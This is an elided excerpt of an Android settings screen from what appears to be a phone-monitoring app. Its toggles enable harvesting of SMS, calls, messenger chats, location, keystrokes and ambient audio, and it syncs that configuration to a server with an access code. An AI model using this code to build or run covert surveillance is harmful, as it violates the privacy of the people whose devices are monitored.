...
public class SyncSettingssss {
    ...
    private SwitchCompat wc_Save_Battery, wc_History_SMS, wc_History_Call,
            wc_History_URL, wc_History_Contact, wc_History_Photo, wc_History_Application, wc_History_Phone_Call, wc_History_WhatsApp, wc_History_Viber, wc_History_Facebook, wc_History_Skype,
            wc_History_Notes, wc_History_Hangouts, wc_History_Location, wc_Auto_TurnOn_Wifi,wc_History_Notification, wc_History_Keylogger, wc_History_AppInstall;
    public Table table;
    private int packageID;
    private List<DeviceFeature> deviceFeatureList = new ArrayList<>();
    public DatabaseGetSetting databaseGetSetting;
    ProgressDialog progressDialog;
    private DeviceFeature deviceFeature = new DeviceFeature();
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        progressDialog = new ProgressDialog(SyncSettingssss.this);
    ...
    *//** Set ID from activity_dashboard for class variable *//*
    private void setID() {
        ...
        List<DeviceFeature> deviceFeatureList = databaseGetSetting.getAllSetting();
    ...
    private int checkDataGPSInterval(String time){
        int check = 0;
        if(time == null){
            check = 2;
            ...
            *//*  int i: Count objects in the User table.
            ...
            if (i == 0) {
                ...
                *//* Check if the table exists! *//*
                ...
                for (DeviceFeature d : deviceFeatureList) {
                ...
                *//*
                ...
                if (testDevice) {
                    APIDatabase.getTimeLastSync(txt_Last_Sync, SyncSettingssss.this, deviceFeature.getModified_Date());


                    if(deviceFeature.getConnection_Type()==null || deviceFeature.getConnection_Type().equals("WiFi|"))
                    {
                    ...
                    if (deviceFeature.getWhatApp().equals("1")) {
                        wc_History_WhatsApp.setChecked(true);
                    }
                    if (deviceFeature.getViber().equals("1")) {
                        wc_History_Viber.setChecked(true);
                    }
                    if (deviceFeature.getFacebook().equals("1")) {
                        wc_History_Facebook.setChecked(true);
                    }
                    if (deviceFeature.getSkype().equals("1")) {
                        wc_History_Skype.setChecked(true);
                    }
                    if (deviceFeature.getNote().equals("1")) {
                        wc_History_Notes.setChecked(true);
                    }

                    if (deviceFeature.getHangouts().equals("1")) {
                        wc_History_Hangouts.setChecked(true);
                    }

                    if (deviceFeature.getSave_Battery().equals("1")) {
        ...
        switch (view.getId()) {
            case R.id.btn_Save_Sync: {
                ...
                if (APIURL.isConnected(this)) {
                    ...
                    APIURL.noInternet(SyncSettingssss.this);
                }
                break;
            }
            case R.id.ln_AccessCode: {
                *//* Open the Access Code class and transmit the Access_Code value *//*
                ...
                intent1 = new Intent(this, AccessCode.class);
    ...
    private class getSettingAsyncTask extends AsyncTask<String, Void, String> {
        ...
        protected void onPostExecute(String s) {
            try {
                ...
                for (DeviceFeature d : databaseGetSetting.getAllSetting()) {
                    if (d.getDevice_ID().equals(deviceFeature.getDevice_ID())) {
                        databaseGetSetting.deleteSetting(d);
                        break;
                    }
                }
                Log.d("gps_interval", deviceFeature.getGPS_Interval() + "");
                ...
                if (deviceFeature.getWhatApp() ==null || deviceFeature.getWhatApp().equals("1")) {
                    wc_History_WhatsApp.setChecked(true);
                }else {
                    wc_History_WhatsApp.setChecked(false);
                }
                if (deviceFeature.getViber() != null && deviceFeature.getViber().equals("1")) {
                    wc_History_Viber.setChecked(true);
                }else {
                    wc_History_Viber.setChecked(false);
                }
                if (deviceFeature.getFacebook() != null && deviceFeature.getFacebook().equals("1")) {
                    wc_History_Facebook.setChecked(true);
                }else {
                    wc_History_Facebook.setChecked(false);
                }
                if (deviceFeature.getSkype() != null && deviceFeature.getSkype().equals("1")) {
                    wc_History_Skype.setChecked(true);
                }else {
                    wc_History_Skype.setChecked(false);
                }
                if (deviceFeature.getNote() != null && deviceFeature.getNote().equals("1")) {
                    wc_History_Notes.setChecked(true);
                }else {
                    wc_History_Notes.setChecked(false);
                }

                if (deviceFeature.getHangouts() != null && deviceFeature.getHangouts().equals("1")) {
                    wc_History_Hangouts.setChecked(true);
                }else {
                    wc_History_Hangouts.setChecked(false);
                }
                if (deviceFeature.getSave_Battery() == null || deviceFeature.getSave_Battery().equals("0")) {
    ...
    private class set_SettingAsyncTask extends AsyncTask<String, Void, String> {
        ...
        protected String doInBackground(String... strings) {
            ...
            int horizontal,GPS_Interval,GPS = 0, SMS = 0, Photo = 0, Skype = 0, Notes = 0, Video = 0, Voice = 0, Ambient_Voice = 0,
                    Key_Logger = 0, BBM = 0, LINE = 0, KIK = 0, Hangouts = 0, save_Battery = 0,
            ...
            if (table.getDevice_ID().equals(ManagementDevice.android_id)) {
                value = "<RequestParams App=\"" + Application + "\" Call=\"" + Call + "\" Voice_Memos=\"" + 0 + "\" GPS_Interval=\"" + GPS_Interval + "\" Bbm=\"" + BBM + "\"" +
                        " Device_Token=\"null\" Secret_Key=\"" + txt_Access_Code.getText() + "\" Hangouts=\"" + Hangouts + "\" Client_Date=\"" + APIURL.getTimeNow() + "\" " +
                        "SMS=\"" + SMS + "\" Device_ID=\"" + table.getDevice_ID() + "\" Video=\"" + 0 + "\" WhatApp=\"" + WhatsApp + "\" Line=\"" + LINE + "\" " +
                        "Kik=\"" + KIK  + "\"  Note=\"" + Notes + "\" Facebook=\"" + Facebook +"\" GPS=\"" + GPS + "\" Skype=\"" + Skype + "\" " +
                        ...
                        " Viber=\"" + Viber + "\"  Country=\"en_US\"  Device_Name=\"" + DEVICE_NAME + "\"  OS_Device=\"" + Global.MODEL + "\" />";
                //App_Version_Number=\""+ Global.MODEL+"\"
            } else {
        ...
        protected void onPostExecute(String s) {
            ...
            try {
                ...
                if (body.getResultId().equals("1") && body.getIsSuccess().equals("1")) {
                    ...
                    APIURL.alertDialogAll(SyncSettingssss.this,"Saved successfully.");
                } else {
                    progressDialog.dismiss();
                    APIURL.alertDialogAll(SyncSettingssss.this,"can't Update!");
        ...
        swp_Dashboard.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            ...
            public void onRefresh() {
                ...
                if (APIURL.isConnected(getApplicationContext())) {
                    ...
                    swp_Dashboard.setRefreshing(false);
                    //
                    APIDatabase.getTimeLastSync(txt_Last_Sync, SyncSettingssss.this, table.getDevice_ID());
                    APIURL.noInternet(SyncSettingssss.this);
                }
            }
        });
